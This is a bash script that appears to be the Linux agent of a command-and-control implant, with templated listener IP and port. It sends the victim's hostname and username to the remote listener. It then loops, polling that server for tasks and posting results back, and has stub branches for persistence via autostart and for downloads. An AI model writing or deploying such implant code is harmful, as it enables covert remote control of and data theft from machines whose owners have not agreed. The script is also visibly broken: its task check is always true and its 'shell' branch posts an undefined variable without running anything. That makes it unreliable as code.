IP={{LISTENER_IP}}
PORT={{LISTENER_PORT}}
sleeptime=3
name=""

hname=$(hostname)
uname=$(whoami)
regurl="http://$IP:$PORT/reg"
name=$(curl -X POST --data "hname=$hname&uname=$uname&type=linux" -H "Content-Type: application/x-www-form-urlencoded" $regurl)

resulturl="http://$IP:$PORT/results/$name"
taskurl="http://$IP:$PORT/tasks/$name"

while true
do
    task=$(curl $taskurl)
    
    command=$(echo $task | awk -F' ' '{ print $1 }')
    args=$(echo $task | awk -F' ' '{$1=""; print $0}')

    if [ -n "task" ]; then
        
        command=$(echo $task | awk -F' ' '{ print $1 }')
        args=$(echo $task | awk -F' ' '{$1=""; print $0}')

        if [ "$command" == "shell" ]; then
            curl -X POST --data "result=$data" -H "Content-Type: application/x-www-form-urlencoded" $resulturl
        fi

        if [ "$command" == "rename" ]; then
            echo ""
            # TODO: rename agent
        fi

        if [ "$command" == "persist" ]; then
            echo ""
            # TODO: save somewhere and add to autostart
        fi

        if [ "$command" == "download" ]; then
            echo "" # TODO download
        fi
        
        if [ "$command" == "terminate" ]; then
            exit
        fi
    fi  

    sleep $sleeptime
done